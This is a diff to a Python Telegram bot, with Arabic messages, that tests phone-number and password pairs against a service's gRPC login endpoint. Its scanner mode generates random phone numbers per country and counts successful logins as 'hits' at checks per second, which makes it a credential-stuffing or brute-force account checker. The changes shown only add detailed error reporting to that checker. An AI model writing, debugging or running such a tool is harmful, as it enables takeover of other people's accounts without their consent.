@@ -175,7 +175,7 @@ class GrpcClient:
             resp = stub(payload, metadata=meta, timeout=timeout)
             return resp, None
         except grpc.RpcError as e:
-            return None, str(e.code())
+            return None, f"{e.code().name}: {e.details()}"
 
     def close(self):
         try: self._ch.close()
@@ -260,7 +260,6 @@ def _gen_phone(cc):
     pref = random.choice(c["prefs"])
     ext = ''.join(str(random.randint(0, 9)) for _ in range(c["ext"]))
     local = pref + ext
-    # إرجاع الرقم متصلاً بدون شرطات ليتوافق مع الخادم
     return c["code"] + local, "0" + local
 
 user_scanners = {}
@@ -424,6 +423,7 @@ def callback_query(call):
             "checked": 0,
             "hits": 0,
             "errors": 0,
+            "last_error": "لا يوجد",
             "start_time": time.time(),
             "cc": cc
         }
@@ -462,7 +462,6 @@ def handle_text_messages(message):
             return
 
         parts = text.split(":", 1)
-        # تنظيف الرقم وإزالة الرموز والشرطات للحصول على الأرقام الصافية فقط
         raw_phone = parts[0].strip().replace("+", "").replace("-", "")
         raw_phone = "".join(filter(str.isdigit, raw_phone))
         password = parts[1].strip()
@@ -492,7 +491,8 @@ def handle_text_messages(message):
                 data, err = cli.call(cli._login, payload)
                 
                 if err or not data:
-                    bot.edit_message_text(chat_id=chat_id, message_id=wait_msg.message_id, text=f"❌ **فشل الاتصال أو خطأ في الشبكة (رمز الخطأ: {err})**", parse_mode="Markdown")
+                    # إظهار سبب الخطأ بالتفصيل هنا
+                    bot.edit_message_text(chat_id=chat_id, message_id=wait_msg.message_id, text=f"❌ **فشل الاتصال أو رفض الطلب!**\n🔍 **سبب الخطأ:** `{err or 'استجابة فارغة من الخادم'}`", parse_mode="Markdown")
                     cli.close()
                     return
 
@@ -526,7 +526,7 @@ def handle_text_messages(message):
                 else:
                     bot.edit_message_text(chat_id=chat_id, message_id=wait_msg.message_id, text=f"❌ **الحساب خطأ أو كلمة المرور غير صحيحة!**\nالرقم: `{formatted_phone}`", parse_mode="Markdown")
             except Exception as e:
-                bot.edit_message_text(chat_id=chat_id, message_id=wait_msg.message_id, text=f"⚠️ حدث خطأ أثناء الفحص: `{str(e)}`", parse_mode="Markdown")
+                bot.edit_message_text(chat_id=chat_id, message_id=wait_msg.message_id, text=f"⚠️ خطأ استثنائي أثناء المعالجة: `{str(e)}`", parse_mode="Markdown")
             finally:
                 cli.close()
 
@@ -551,6 +551,7 @@ def run_user_scanner(chat_id, message_id, cc):
 
                 if err:
                     state["errors"] += 1
+                    state["last_error"] = str(err) # تسجيل سبب الخطأ الحقيقي لعرضه في الإحصائيات
                 elif data:
                     res = _parse_login(data)
                     if res.get("status") == "hit":
@@ -578,6 +579,7 @@ def run_user_scanner(chat_id, message_id, cc):
                         f"• تم فحص: `{state['checked']}` رقم\n"
                         f"• الصيد الصحيح (Hits): `{state['hits']}` 🎯\n"
                         f"• الأخطاء: `{state['errors']}` ⚠️\n"
+                        f"• سبب آخر خطأ: `{state.get('last_error', 'لا يوجد')}` 🔍\n"
                         f"• السرعة: `{speed:.1f} فحص/ثانية` ⚡\n"
                         f"• الوقت المنقضي: `{elapsed} ثانية` ⏱"
                     )
@@ -591,7 +593,10 @@ def run_user_scanner(chat_id, message_id, cc):
                         )
                     except:
                         pass
-        except:
+        except Exception as e:
+            state = user_scanners.get(chat_id)
+            if state:
+                state["last_error"] = str(e)
             time.sleep(1)
 
     cli.close()
@@ -608,5 +613,5 @@ def run_user_scanner(chat_id, message_id, cc):
         pass
 
 if __name__ == "__main__":
-    print("Bot is running with fully cleaned phone formatting and isolated sessions...")
+    print("Bot is running with detailed error logging...")
     bot.infinity_polling()
